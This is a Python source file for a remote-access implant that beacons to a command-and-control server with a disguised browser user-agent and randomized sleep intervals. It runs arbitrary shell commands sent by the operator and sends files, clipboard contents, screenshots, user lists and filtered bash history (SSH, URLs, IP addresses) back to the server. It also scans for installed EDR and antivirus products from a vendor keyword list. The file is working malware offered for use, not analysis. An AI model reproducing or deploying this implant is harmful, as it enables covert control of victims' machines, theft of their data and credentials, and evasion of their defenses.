import time
import pyperclip
import requests
import json
import subprocess
import random
import urllib3
import os
from PIL import ImageGrab
import io

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
C2_SERVER_URL = "http://0.0.0.0:8080"
CHECK_IN_ENDPOINT = "/check-in"
RESULTS_ENDPOINT = "/send-results"
SLEEP_INTERVAL = 30  # Time to wait between beacons (in seconds)
TIMEOUT = 600  # Timeout for the server's response (in seconds)
AUTH_TOKEN = "Bearer YOUR_SECRET_KEY"  # Replace with your authorization token
HEADERS = {
    "Authorization": AUTH_TOKEN,
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
}

def send_output(endpoint:str,data):
    try:
        requests.post(C2_SERVER_URL+endpoint,verify=False,headers=HEADERS,data=data)
    except Exception as e:
        print(e)
def check_in():
    """Send a Check-In GET request to the server."""
    try:
        print("[*] Sending Check-In request...")
        response = requests.get(C2_SERVER_URL+CHECK_IN_ENDPOINT, verify=False, headers=HEADERS, timeout=TIMEOUT)
        response.raise_for_status()  # Raise an exception for error HTTP statuses
        print("[*] Check-In successful")
        return response.json()

    except requests.exceptions.Timeout:
        print("[!] Check-In request timed out.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during Check-In: {e}")
    return []

def handle_exit(command):
    output = "Exiting the session. Goodbye!"
    
    # Send the output back to the server (if applicable)
    send_output(endpoint='/exit',data=output)
    
    # Exit the program
    exit(0)

def handle_pwd(command):
    pwd = subprocess.run("pwd",shell=True,text=True,capture_output=True)
    data = pwd.stdout.encode()
    send_output(endpoint="/path",data=data)

def handle_cat(command):
    cat_file = subprocess.run(command,shell=True,text=True,capture_output=True)
    if cat_file.returncode != 0:
        data = f"Error: {cat_file.stderr}".encode()
    else:
        data = cat_file.stdout.encode()
    send_output(endpoint="/catfile",data=data)

def handle_listdir(command):
    list_dir = subprocess.run("ls",shell=True,text=True,capture_output=True)
    data = list_dir.stdout.encode()
    send_output(endpoint="/listdir",data=data)

def handle_whoami(command):
    wdata = subprocess.run("whoami",shell=True,text=True,capture_output=True)
    data = wdata.stdout.encode()
    send_output(endpoint="/whoami",data=data)

def handle_connections(command):
    connections = subprocess.run("ss -tuln",shell=True,text=True,capture_output=True)
    data = connections.stdout.encode()
    send_output(endpoint="/connections",data=data)

def handle_cd(command):
    output = ""
    
    try:
        # Extract the target directory from the command
        target_dir = command.strip().split(maxsplit=1)[1]
        
        # Change the directory
        os.chdir(target_dir)
        
        # Get the new current directory
        output = f"Changed directory to: {os.getcwd()}"
    except IndexError:
        # Handle case where no directory is specified
        output = "Error: No directory specified."
    except FileNotFoundError:
        # Handle case where the directory does not exist
        output = f"Error: Directory not found: {target_dir}"
    except PermissionError:
        # Handle case where there is a permission issue
        output = f"Error: Permission denied: {target_dir}"
    except Exception as e:
        # Handle any other unforeseen errors
        output = f"Error: {str(e)}"
    
    # Send the output back to the server
    send_output(endpoint='/cdfile',data=output)

def handle_addresses(command):
    addresses = subprocess.run("ip addr",shell=True,text=True,capture_output=True)
    data = addresses.stdout.encode()
    send_output(endpoint="/addresses",data=data)

def handle_listusers(command):
    listusers = subprocess.run("cut -d: -f1 /etc/passwd",shell=True,text=True,capture_output=True)
    data = listusers.stdout.encode()
    send_output(endpoint="/listusers",data=data)

def handle_userhist(command):
    command = "grep -E 'ssh|http|https|@|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' ~/.bash_history"
    userhist = subprocess.run(command,shell=True,text=True,capture_output=True)
    data = userhist.stdout.encode()
    send_output(endpoint="/userhist",data=data)

def handle_screenshot(command):
    output = ""

    try:
        # Capture the screenshot
        screenshot = ImageGrab.grab()

        # Save the screenshot to a buffer in PNG format
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)

        # You can send the buffer content to the server or save it as a file
        # Save locally as an example
        screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
        with open(screenshot_path, "wb") as f:
            f.write(buffer.read())

        output = buffer.read()
    except Exception as e:
        # Handle errors gracefully
        output = f"Error taking screenshot: {str(e)}"

    # Send the result or error message back to the server
    HEADERS["Content-Type"] = "image/png"
    send_output(endpoint='/screenshot',data=output)

def handle_checksecurity(command):
    # List of keywords to identify EDR products
    edr_keywords = [
        "CbOsxSensorService", "CbDefense", "xagt", "falconctl", "ESET",
        "Littlesnitch", "sentinel", "globalprotect", "paloalto", "fireeye",
        "carbonblack", "mcafee", "symantec", "trendmicro", "kaspersky",
        "sophos", "bitdefender", "opendns", "zscaler"
    ]

    # Commands to search in various areas
    detection_methods = {
        "Processes": ["ps", "aux"],
        "Installed Packages": ["dpkg", "-l"],
        "Services": ["systemctl", "list-units"],
        "Drivers": ["lsmod"],
        "Network Connections": ["netstat", "-antp"]
    }

    detected_edrs = set()

    for category, command in detection_methods.items():
        try:
            output = subprocess.check_output(command, universal_newlines=True)
            for keyword in edr_keywords:
                if keyword.lower() in output.lower():
                    detected_edrs.add(keyword)
        except Exception as e:
            pass

    # send detected EDR products
    edrs = ""
    for edr in detected_edrs:
        edrs += f"- {edr}\n"
    send_output(endpoint='/checksecurity',data=edrs.encode())

def handle_download(command):
    """Process the download command by reading a file and sending it to the server."""
    try:
        filename = command.split(" ")[1] if len(command.split(" ")) > 1 else None
        if not filename:
            data = b"Error: No filename provided"
        
        if not os.path.exists(filename):
            data = b"Error: File not found"

        with open(filename,"rb") as file:
            data = file.read()
        
    except Exception as e:
        pass
        # data = f"Error: {str(e)}".encode()

    send_output(endpoint="/download",data=data)

def handle_persist(command):
    print("Handling persist command...")

def handle_unpersist(command):
    print("Handling unpersist command...")

def handle_prompt(command):
    print("Handling prompt command...")

def handle_systeminfo(command):
    sys_info = subprocess.run("uname -a",shell=True,text=True,capture_output=True)
    cpu_info = subprocess.run("lscpu",shell=True,text=True,capture_output=True)
    memory_info = subprocess.run("free -h",shell=True,text=True,capture_output=True)
    disk_info = subprocess.run("df -a",shell=True,text=True,capture_output=True)
    net_info = subprocess.run("ip a",shell=True,text=True,capture_output=True)
    gpu_info = subprocess.run("lspci",shell=True,text=True,capture_output=True)
    data = f"\033[35mSystem info:\033[0m \n{sys_info} \n\033[35mCPU Info:\033[0m \n{cpu_info} \n\033[35mMemory Info:\033[0m \n{memory_info} \n\033[35mDisk Info:\033[0m \n{disk_info} \n\033[35mNetwork Info:\033[0m \n{net_info} \n\033[35mGPU Info:\033[0m \n{gpu_info}".encode()
    send_output(endpoint='/sysinfo',data=data)

def handle_clipboard(command):
    print("Handling clipboard command...")
    try:
        # Get clipboard content
        clipboard_content = pyperclip.paste()  # For pyperclip, use pyperclip.paste()
        
        if not clipboard_content.strip():
            clipboard_content = "Error: Clipboard is empty or contains non-text data."
        
    except Exception as e:
        clipboard_content = f"Error: {e}"

    # Send clipboard content to the server
    response = send_output(endpoint='/clipboard',data=clipboard_content.encode())

def handle_shell(command):
    output = ""

    # Check if command starts with "shell"
    if command.startswith("shell "):
        # Extract the actual command by stripping "shell " from the start
        shell_command = command[6:].strip()
        
        try:
            if shell_command.strip() == "":
                output = "Error: Command not found"
                print(output)
            else:
                print
                # Run the shell command
                result = subprocess.run(shell_command, shell=True, capture_output=True, text=True)
                
                # Check if the command was successful (returncode == 0)
                if result.returncode == 0:
                    # If successful, return the output
                    output = f"[+] Command output:\033[0m\n{result.stdout.strip()}" if result.stdout.strip() else "Command executed successfully with no output."
                else:
                    # If there's an error, capture the error message
                    output = f"Error executing command: {result.stderr.strip()}"
        
        except Exception as e:
            # In case of exception, capture it in the error message
            output = f"Error: {str(e)}"
    # Send the response back to the server
    print(output)
    send_output(endpoint='/shell',data=output.encode())

def handle_sleep(command):
    message = ""  # Variable to store the response message
    try:
        # Check for the correct format
        # Extract the sleep duration
        duration_str = command.split(" ")[1]
        # Convert duration to a float
        try:
            duration = float(duration_str)
            # Validate the duration
            if duration <= 0:
                message = "ERROR_NON_POSITIVE_DURATION"
            else:
                # Perform sleep
                SLEEP_INTERVAL = duration
                message = f"[+] Successfully slept for {duration} seconds."
                print(message)
        except ValueError:
            message = "ERROR_INVALID_DURATION"

    except Exception as e:
        message = f"Error: during sleep: {e}"

    # Send the response back to the server
    send_output(endpoint='/sleep',data=message.encode())

# Create a switch-like dictionary
commands_switch = {
    "exit": handle_exit,
    "pwd": handle_pwd,
    "cat": handle_cat,
    "listdir": handle_listdir,
    "whoami": handle_whoami,
    "connections": handle_connections,
    "cd": handle_cd,
    "addresses": handle_addresses,
    "listusers": handle_listusers,
    "userhist": handle_userhist,
    "screenshot": handle_screenshot,
    "download": handle_download,
    "checksecurity": handle_checksecurity,
    "persist": handle_persist,
    "unpersist": handle_unpersist,
    "prompt": handle_prompt,
    "systeminfo": handle_systeminfo,
    "clipboard": handle_clipboard,
    "shell": handle_shell,
    "sleep": handle_sleep,
}

def handle_command(command):
    # Get the corresponding function for the command
    action = commands_switch.get(command.split(" ")[0], None)
    print
    if action:
        action(command)  # Execute the command's function
    else:
        pass



def main():
    while True:
        commands = check_in()
        if commands:
            for command in commands:
                print(f"Executing command {command}")
                output = handle_command(command)

        time.sleep(random.randint(SLEEP_INTERVAL - 5, SLEEP_INTERVAL + 5))  # Add jitter to sleep times

if __name__ == "__main__":
    main()